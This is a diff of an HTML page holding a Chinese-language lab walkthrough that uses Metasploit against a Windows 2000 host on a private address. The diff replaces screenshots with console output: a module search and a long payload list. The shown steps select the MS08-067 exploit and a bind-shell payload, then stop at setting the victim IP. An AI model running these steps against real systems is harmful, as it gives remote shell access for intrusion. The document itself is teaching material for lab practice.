@@ -474,12 +474,164 @@ vertical-align:1px;
 <ul>
 <li>攻击方：Kali 2.0</li><li>受害者：Windows 2000</li><li>受害者IP：192.168.121.130</li></ul>
 <p>先搜一下相关</p>
-<p><img src="Image/1.png" alt=""></p>
-<p>使用这个exp</p>
+<pre><code>msf &gt; search netapi
+Matching Modules
+================
+   Name                                 Disclosure Date  Rank    Description
+   ----                                 ---------------  ----    -----------
+   exploit/windows/smb/ms03_049_netapi  2003-11-11       good    MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   exploit/windows/smb/ms06_040_netapi  2006-08-08       good    MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   exploit/windows/smb/ms08_067_netapi  2008-10-28       great   MS08-067 Microsoft Server Service Relative Path Stack Corruption
+</code></pre><p>使用这个exp</p>
 <pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi
 </code></pre><p>显示可用payload也就是shellcode</p>
-<p><img src="Image/2.png" alt=""></p>
-<p>使用这个payload</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; show payloads 
+Compatible Payloads
+===================
+   Name                                                Disclosure Date  Rank    Description
+   ----                                                ---------------  ----    -----------
+   generic/custom                                                       normal  Custom Payload
+   generic/debug_trap                                                   normal  Generic x86 Debug Trap
+   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
+   generic/tight_loop                                                   normal  Generic x86 Tight Loop
+   windows/dllinject/bind_hidden_ipknock_tcp                            normal  Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
+   windows/dllinject/bind_hidden_tcp                                    normal  Reflective DLL Injection, Hidden Bind TCP Stager
+   windows/dllinject/bind_ipv6_tcp                                      normal  Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
+   windows/dllinject/bind_ipv6_tcp_uuid                                 normal  Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/dllinject/bind_nonx_tcp                                      normal  Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
+   windows/dllinject/bind_tcp                                           normal  Reflective DLL Injection, Bind TCP Stager (Windows x86)
+   windows/dllinject/bind_tcp_rc4                                       normal  Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption)
+   windows/dllinject/bind_tcp_uuid                                      normal  Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
+   windows/dllinject/reverse_hop_http                                   normal  Reflective DLL Injection, Reverse Hop HTTP Stager
+   windows/dllinject/reverse_http                                       normal  Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
+   windows/dllinject/reverse_ipv6_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (IPv6)
+   windows/dllinject/reverse_nonx_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
+   windows/dllinject/reverse_ord_tcp                                    normal  Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/dllinject/reverse_tcp                                        normal  Reflective DLL Injection, Reverse TCP Stager
+   windows/dllinject/reverse_tcp_allports                               normal  Reflective DLL Injection, Reverse All-Port TCP Stager
+   windows/dllinject/reverse_tcp_dns                                    normal  Reflective DLL Injection, Reverse TCP Stager (DNS)
+   windows/dllinject/reverse_tcp_rc4                                    normal  Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption)
+   windows/dllinject/reverse_tcp_uuid                                   normal  Reflective DLL Injection, Reverse TCP Stager with UUID Support
+   windows/dllinject/reverse_winhttp                                    normal  Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)
+   windows/dns_txt_query_exec                                           normal  DNS TXT Record Payload Download and Execution
+   windows/exec                                                         normal  Windows Execute Command
+   windows/format_all_drives                                            manual  Windows Drive Formatter
+   windows/loadlibrary                                                  normal  Windows LoadLibrary Path
+   windows/messagebox                                                   normal  Windows MessageBox
+   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
+   windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
+   windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption)
+   windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter (Reflective Injection), Reverse Hop HTTP Stager
+   windows/meterpreter/reverse_http                                     normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   windows/meterpreter/reverse_https                                    normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+   windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy
+   windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
+   windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+   windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
+   windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
+   windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption)
+   windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
+   windows/meterpreter/reverse_winhttp                                  normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+   windows/meterpreter/reverse_winhttps                                 normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
+   windows/metsvc_bind_tcp                                              normal  Windows Meterpreter Service, Bind TCP
+   windows/metsvc_reverse_tcp                                           normal  Windows Meterpreter Service, Reverse TCP Inline
+   windows/patchupdllinject/bind_hidden_ipknock_tcp                     normal  Windows Inject DLL, Hidden Bind Ipknock TCP Stager
+   windows/patchupdllinject/bind_hidden_tcp                             normal  Windows Inject DLL, Hidden Bind TCP Stager
+   windows/patchupdllinject/bind_ipv6_tcp                               normal  Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
+   windows/patchupdllinject/bind_ipv6_tcp_uuid                          normal  Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/patchupdllinject/bind_nonx_tcp                               normal  Windows Inject DLL, Bind TCP Stager (No NX or Win7)
+   windows/patchupdllinject/bind_tcp                                    normal  Windows Inject DLL, Bind TCP Stager (Windows x86)
+   windows/patchupdllinject/bind_tcp_rc4                                normal  Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption)
+   windows/patchupdllinject/bind_tcp_uuid                               normal  Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
+   windows/patchupdllinject/reverse_ipv6_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (IPv6)
+   windows/patchupdllinject/reverse_nonx_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
+   windows/patchupdllinject/reverse_ord_tcp                             normal  Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/patchupdllinject/reverse_tcp                                 normal  Windows Inject DLL, Reverse TCP Stager
+   windows/patchupdllinject/reverse_tcp_allports                        normal  Windows Inject DLL, Reverse All-Port TCP Stager
+   windows/patchupdllinject/reverse_tcp_dns                             normal  Windows Inject DLL, Reverse TCP Stager (DNS)
+   windows/patchupdllinject/reverse_tcp_rc4                             normal  Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption)
+   windows/patchupdllinject/reverse_tcp_uuid                            normal  Windows Inject DLL, Reverse TCP Stager with UUID Support
+   windows/patchupmeterpreter/bind_hidden_ipknock_tcp                   normal  Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
+   windows/patchupmeterpreter/bind_hidden_tcp                           normal  Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
+   windows/patchupmeterpreter/bind_ipv6_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/patchupmeterpreter/bind_ipv6_tcp_uuid                        normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/patchupmeterpreter/bind_nonx_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/bind_tcp                                  normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
+   windows/patchupmeterpreter/bind_tcp_rc4                              normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption)
+   windows/patchupmeterpreter/bind_tcp_uuid                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/patchupmeterpreter/reverse_ipv6_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
+   windows/patchupmeterpreter/reverse_nonx_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/reverse_ord_tcp                           normal  Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/patchupmeterpreter/reverse_tcp                               normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
+   windows/patchupmeterpreter/reverse_tcp_allports                      normal  Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
+   windows/patchupmeterpreter/reverse_tcp_dns                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
+   windows/patchupmeterpreter/reverse_tcp_rc4                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption)
+   windows/patchupmeterpreter/reverse_tcp_uuid                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
+   windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager
+   windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager
+   windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
+   windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager (No NX or Win7)
+   windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager (Windows x86)
+   windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption)
+   windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
+   windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (IPv6)
+   windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
+   windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
+   windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager
+   windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager (DNS)
+   windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption)
+   windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support
+   windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline
+   windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline
+   windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline
+   windows/speak_pwned                                                  normal  Windows Speech API - Say &quot;You Got Pwned!&quot;
+   windows/upexec/bind_hidden_ipknock_tcp                               normal  Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
+   windows/upexec/bind_hidden_tcp                                       normal  Windows Upload/Execute, Hidden Bind TCP Stager
+   windows/upexec/bind_ipv6_tcp                                         normal  Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
+   windows/upexec/bind_ipv6_tcp_uuid                                    normal  Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/upexec/bind_nonx_tcp                                         normal  Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
+   windows/upexec/bind_tcp                                              normal  Windows Upload/Execute, Bind TCP Stager (Windows x86)
+   windows/upexec/bind_tcp_rc4                                          normal  Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption)
+   windows/upexec/bind_tcp_uuid                                         normal  Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
+   windows/upexec/reverse_ipv6_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (IPv6)
+   windows/upexec/reverse_nonx_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
+   windows/upexec/reverse_ord_tcp                                       normal  Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/upexec/reverse_tcp                                           normal  Windows Upload/Execute, Reverse TCP Stager
+   windows/upexec/reverse_tcp_allports                                  normal  Windows Upload/Execute, Reverse All-Port TCP Stager
+   windows/upexec/reverse_tcp_dns                                       normal  Windows Upload/Execute, Reverse TCP Stager (DNS)
+   windows/upexec/reverse_tcp_rc4                                       normal  Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption)
+   windows/upexec/reverse_tcp_uuid                                      normal  Windows Upload/Execute, Reverse TCP Stager with UUID Support
+   windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   windows/vncinject/bind_hidden_tcp                                    normal  VNC Server (Reflective Injection), Hidden Bind TCP Stager
+   windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/vncinject/bind_nonx_tcp                                      normal  VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   windows/vncinject/bind_tcp                                           normal  VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
+   windows/vncinject/bind_tcp_rc4                                       normal  VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption)
+   windows/vncinject/bind_tcp_uuid                                      normal  VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   windows/vncinject/reverse_hop_http                                   normal  VNC Server (Reflective Injection), Reverse Hop HTTP Stager
+   windows/vncinject/reverse_http                                       normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
+   windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   windows/vncinject/reverse_ord_tcp                                    normal  VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   windows/vncinject/reverse_tcp                                        normal  VNC Server (Reflective Injection), Reverse TCP Stager
+   windows/vncinject/reverse_tcp_allports                               normal  VNC Server (Reflective Injection), Reverse All-Port TCP Stager
+   windows/vncinject/reverse_tcp_dns                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
+   windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption)
+   windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
+   windows/vncinject/reverse_winhttp                                    normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+</code></pre><p>使用这个payload</p>
 <pre><code>msf exploit(ms08_067_netapi) &gt; set payload windows/shell/bind_tcp
 payload =&gt; windows/shell/bind_tcp
 </code></pre><p>设置受害者IP</p>
